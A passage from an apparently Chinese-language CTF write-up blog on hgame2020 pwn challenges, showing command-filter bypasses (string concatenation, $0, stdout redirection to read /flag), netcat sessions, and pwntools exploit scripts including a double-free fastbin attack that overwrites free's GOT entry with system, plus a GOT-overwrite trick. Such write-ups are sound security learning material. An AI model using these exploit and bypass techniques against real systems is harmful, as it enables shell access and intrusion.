class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> shell 1</span></span><br><span class="line"><span class="meta">%</span><span class="bash"> nc 47.103.214.163 21000</span></span><br><span class="line">find yourself</span><br><span class="line">ls -ali</span><br><span class="line">total 8</span><br><span class="line">1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 .</span><br><span class="line">1968682 drwxrwxrwx 152    0    0 4096 Jan 27 12:50 ..</span><br><span class="line">where are you?</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> shell 2</span></span><br><span class="line"><span class="meta">%</span><span class="bash"> nc 47.103.214.163 21000 | grep 1968846</span></span><br><span class="line">ls -ali /tmp</span><br><span class="line">1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 0x8eb79f31</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> shell 1</span></span><br><span class="line"><span class="meta">%</span><span class="bash"> nc 47.103.214.163 21000</span></span><br><span class="line">find yourself</span><br><span class="line">ls -ali</span><br><span class="line">total 8</span><br><span class="line">1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 .</span><br><span class="line">1968682 drwxrwxrwx 152    0    0 4096 Jan 27 12:50 ..</span><br><span class="line">where are you?</span><br><span class="line">/tmp/0x8eb79f31</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="0x2-check2"><a href="#0x2-check2" class="headerlink" title="0x2 check2"></a>0x2 check2</h3><ul><li><p>过滤的字符(串)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh cat * &amp; | &gt; &lt;</span><br></pre></td></tr></table></figure></div></li><li><p>这个简单多了，字符串拼接即可绕过</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=h;s$x</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="0x3-close-1-and-close-2"><a href="#0x3-close-1-and-close-2" class="headerlink" title="0x3 close(1) and close(2)"></a>0x3 close(1) and close(2)</h3><ul><li><p>关闭了<code>stdout</code>和<code>stderr</code>，即使<code>cat flag</code>也得不到输出<code>u_u</code></p></li><li><p>于是，重定向，把<code>stdout</code>和<code>stderr</code>重定向到<code>stdin</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag 1&gt;&amp;0</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="0x4-fini"><a href="#0x4-fini" class="headerlink" title="0x4 fini"></a>0x4 fini</h3><ul><li>这题在<code>check1</code>卡了好久，第三天才想到<code>ls -i</code>，我太菜了。</li></ul><h3 id="0x5-exp"><a href="#0x5-exp" class="headerlink" title="0x5 exp"></a>0x5 exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./fys'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line">cmd1 = <span class="string">'ls -ali'</span></span><br><span class="line">ru(<span class="string">'find yourself\n'</span>)</span><br><span class="line">sl(cmd1)</span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'where are you?\n'</span>)</span><br><span class="line"></span><br><span class="line">cmd2 = <span class="string">'a=t;b=ag;ca$a fl$b'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="0x6-官方解"><a href="#0x6-官方解" class="headerlink" title="0x6 官方解"></a>0x6 官方解</h3><ul><li><p>这题本来的考察点<code>proc</code>，硬是让我用<code>ls -i</code>解出来了…还是要多学些东西…</p></li><li><p><code>check1</code> : <code>ls -l /proc/self/cwd</code> </p></li><li><p><code>check2</code>: <code>$0</code> </p></li><li><p>赶紧学习一波<code>/proc</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">% nc 47.103.214.163 21000</span><br><span class="line">find yourself</span><br><span class="line">ls -al &#x2F;proc&#x2F;self&#x2F;</span><br><span class="line">total 0</span><br><span class="line">dr-xr-xr-x   9 1000 1000 0 Feb  1 09:44 .</span><br><span class="line">dr-xr-xr-x 121    0    0 0 Feb  1 09:42 ..</span><br><span class="line">dr-xr-xr-x   2 1000 1000 0 Feb  1 09:44 attr</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 autogroup</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 auxv</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 cgroup</span><br><span class="line">--w-------   1 1000 1000 0 Feb  1 09:44 clear_refs</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 cmdline</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 comm</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 coredump_filter</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 cpuset</span><br><span class="line">lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 cwd -&gt; &#x2F;tmp&#x2F;0xb3f14a49</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 environ</span><br><span class="line">lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 exe -&gt; &#x2F;bin&#x2F;ls</span><br><span class="line">dr-x------   2 1000 1000 0 Feb  1 09:44 fd</span><br><span class="line">dr-x------   2 1000 1000 0 Feb  1 09:44 fdinfo</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 gid_map</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 io</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 limits</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 loginuid</span><br><span class="line">dr-x------   2 1000 1000 0 Feb  1 09:44 map_files</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 maps</span><br><span class="line">-rw-------   1 1000 1000 0 Feb  1 09:44 mem</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 mountinfo</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 mounts</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 mountstats</span><br><span class="line">dr-xr-xr-x   5 1000 1000 0 Feb  1 09:44 net</span><br><span class="line">dr-x--x--x   2 1000 1000 0 Feb  1 09:44 ns</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 numa_maps</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 oom_adj</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 oom_score</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 oom_score_adj</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 pagemap</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 patch_state</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 personality</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 projid_map</span><br><span class="line">lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 root -&gt; &#x2F;</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 sched</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 schedstat</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 sessionid</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 setgroups</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 smaps</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 smaps_rollup</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 stack</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 stat</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 statm</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 status</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 syscall</span><br><span class="line">dr-xr-xr-x   3 1000 1000 0 Feb  1 09:44 task</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 timers</span><br><span class="line">-rw-rw-rw-   1 1000 1000 0 Feb  1 09:44 timerslack_ns</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 uid_map</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 wchan</span><br><span class="line">where are you?</span><br><span class="line">&#x2F;tmp&#x2F;0xb3f14a49</span><br><span class="line">$0</span><br><span class="line">exec &gt;&amp;0</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">hgame&#123;You_4re_So_C1EV3R&#125;</span><br></pre></td></tr></table></figure></div></li></ul><h2 id="Roc826"><a href="#Roc826" class="headerlink" title="Roc826"></a>Roc826</h2><ul><li>题目描述：不好好学C的话是很容易随手写出PWN题的</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_2/Roc826" target="_blank" rel="noopener">Roc826</a></li><li>考察点：<code>double free</code>、<code>unsorted bin leak</code></li><li>难度：入门</li><li>分值：300</li><li>完成人数：35</li></ul><p>这题是堆的入门级别的题目，然鹅我并不会做堆的题，所以比赛时没做，后来照着官方wp赶紧学习一波</p><h3 id="0x0-背景姿势"><a href="#0x0-背景姿势" class="headerlink" title="0x0 背景姿势"></a>0x0 背景姿势</h3><ul><li>glibc (&lt;2.27)堆分配的策略：即 first-fit。在分配内存时,malloc 会先到 unsorted bin(或者fastbins) 中查找适合的被 free 的 chunk,如果没有,就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中,然后再去这些 bins 里去找合适的 chunk。可以看到第三次 malloc 的地址和第一次相同,即 malloc 找到了第一次 free 掉的chunk,并把它重新分配。</li><li>fast chunk表示正在使用的长度在<code>32-160</code>(32位系统是<code>16-80</code>)的堆块，而fastbin表示长度在<code>32-180</code>范围内的已经释放的堆块</li></ul><h3 id="0x1-漏洞利用"><a href="#0x1-漏洞利用" class="headerlink" title="0x1 漏洞利用"></a>0x1 漏洞利用</h3><ul><li><p><code>unsorted bin leak</code> ：泄漏<code>main_arena</code>地址（即<code>__malloc_hook-0x68</code>）</p></li><li><p><code>double free</code>：<code>fastbin attack</code>覆写<code>free</code>的<code>got</code>表为<code>system</code>地址，或者改<code>free_hook</code>为<code>one_gadget</code>都可以<code>getshell</code></p></li></ul><h3 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h3>  <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Roc826'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc-2.23.so'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,cont=<span class="string">'aaaa'</span>)</span>:</span></span><br><span class="line">    sla(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">    sla(<span class="string">'size?\n'</span>,str(size))</span><br><span class="line">    sla(<span class="string">'content:'</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">':'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">'index?\n'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line">    sla(<span class="string">'index?\n'</span>,str(index))</span><br><span class="line">    ru(<span class="string">'content:'</span>)</span><br><span class="line">    <span class="keyword">return</span> ru(<span class="string">'-----------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">data = show(<span class="number">0</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>)</span><br><span class="line">log.hexdump(data)</span><br><span class="line">libcbase = u64(data) - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x68</span></span><br><span class="line">info_addr(<span class="string">'libcbase'</span>,libcbase)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">0x58</span>,p64(<span class="number">0x601ffa</span>)) <span class="comment"># got[free]-14-16</span></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'aaaaaaaaaaaaaa'</span>+p64(libcbase+libc.sym[<span class="string">'system'</span>])[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Another-Heaven"><a href="#Another-Heaven" class="headerlink" title="Another_Heaven"></a>Another_Heaven</h2><ul><li>题目描述：永遠と呼びたい 君に 出逢えた ことだけは（什么鬼…）</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_3/Another_Heaven" target="_blank" rel="noopener">Another_Heaven</a></li><li>考察点：GOT改写</li><li>难度：简单</li><li>分值：200</li><li>完成人数：35</li></ul><h3 id="0x0-程序分析-1"><a href="#0x0-程序分析-1" class="headerlink" title="0x0 程序分析"></a>0x0 程序分析</h3><p>反汇编分析代码，发现有一个<code>Pxxxhub</code>的后门，可修改<code>1</code>字节任意内存：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"There is a back door...\"Hacked by Annevi!\""</span>);</span><br><span class="line">*addr = readi();</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, *addr, <span class="number">1u</span>LL);</span><br></pre></td></tr></table></figure></div><p><code>init()</code>中读了<code>flag</code>，随后有个<code>strcmp</code>对比<code>password</code>与<code>flag</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Password:"</span>, account);</span><br><span class="line">read_n(password, <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(password, flag) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Welcome!The emperor Qie!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"|Recommended|Hottest|Most Viewed......"</span>);</span><br><span class="line">result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="0x1-漏洞利用-1"><a href="#0x1-漏洞利用-1" class="headerlink" title="0x1 漏洞利用"></a>0x1 漏洞利用</h3><p>用修改<code>1</code>字节任意内存的后门改写<code>GOT</code>表，把<code>strcmp</code>改为<code>printf</code></p><p>然后就是骚操作了：读<code>password</code>时，输入<code>%s</code>，这时候：</p><blockquote><p><code>strcmp(password, flag)</code>相当于<code>printf(&quot;%s&quot;,flag)</code></p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> nc 47.103.214.163 21001</span></span><br><span class="line">There is a back door..."Hacked by Annevi!"</span><br><span class="line">6299752</span><br><span class="line">&amp;</span><br><span class="line">==========================================</span><br><span class="line">____</span><br><span class="line">|  _ \ ___  _ __ _ __ | | | |_   _| |__  </span><br><span class="line">| |_) / _ \| '__| '_ \| |_| | | | | '_ \ </span><br><span class="line">|  __/ (_) | |  | | | |  _  | |_| | |_) 